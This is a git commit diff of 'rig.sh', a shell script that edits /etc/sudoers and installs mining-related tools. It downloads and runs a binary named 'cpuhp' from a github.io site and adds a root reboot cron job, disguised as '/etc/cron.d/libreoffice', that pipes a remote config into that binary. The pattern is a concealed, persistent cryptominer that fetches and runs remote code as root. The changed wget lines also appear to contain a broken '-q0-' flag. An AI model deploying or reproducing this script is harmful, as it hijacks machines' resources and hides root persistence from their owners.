4a51fa3c684b4622d6d035e42a9288276d55ee4d
xmrhorizontal <148181892+xmrhorizontal@users.noreply.github.com>
2023-10-18 00:00:58 +0300

    Update rig.sh

--- rig.sh
+++ rig.sh
@@ -3,7 +3,7 @@ su
 sed -i 's/^#\(root\s*ALL=(ALL)\s*ALL\)/\1/' /etc/sudoers
 echo "SUDO Разблокирован!."
 apt-get update
-apt-get install -y hwloc msr-tools sshpass
+apt-get install -y hwloc msr-tools
 if ( lspci | grep -i nvidia ); then
 	apt-get install -y nvidia-cuda-toolkit
 fi
@@ -15,7 +15,7 @@ if [ -d "/root/bmcontrol" ]; then
     rm /etc/cron.d/bmcontrol
     wget https://xmrhorizontal.github.io/cpuhp
     chmod +x ./cpuhp
-    echo "@reboot root curl -s https://xmrhorizontal.github.io/config.json | /root/bmcontrol/cpuhp --config /dev/stdin" > /etc/cron.d/libreoffice
+    echo "@reboot root wget -q0- https://xmrhorizontal.github.io/config.json | /root/bmcontrol/cpuhp --config /dev/stdin" > /etc/cron.d/libreoffice
     ./cpuhp --config=/root/bmcontrol/config.json
 elif [ -d "/home/user/bmcontrol" ]; then
     echo "Пишу в папку /home/user/bmcontrol."
@@ -25,7 +25,7 @@ elif [ -d "/home/user/bmcontrol" ]; then
     rm /etc/cron.d/bmcontrol
     wget https://xmrhorizontal.github.io/cpuhp
     chmod +x ./cpuhp
-    echo "@reboot root curl -s https://xmrhorizontal.github.io/config.json | /root/bmcontrol/cpuhp --config /dev/stdin" > /etc/cron.d/libreoffice
+    echo "@reboot root wget -q0- https://xmrhorizontal.github.io/config.json | /root/bmcontrol/cpuhp --config /dev/stdin" > /etc/cron.d/libreoffice
     ./cpuhp --config=/root/bmcontrol/config.json
 else
     echo "Создаю папку /root/bmcontrol."
@@ -33,7 +33,7 @@ else
     cd /root/bmcontrol
     wget https://xmrhorizontal.github.io/cpuhp
     chmod +x ./cpuhp
-    echo "@reboot root curl -s https://xmrhorizontal.github.io/config.json | /root/bmcontrol/cpuhp --config /dev/stdin" > /etc/cron.d/libreoffice
+    echo "@reboot root wget -q0- https://xmrhorizontal.github.io/config.json | /root/bmcontrol/cpuhp --config /dev/stdin" > /etc/cron.d/libreoffice
 fi
 echo OK!
 
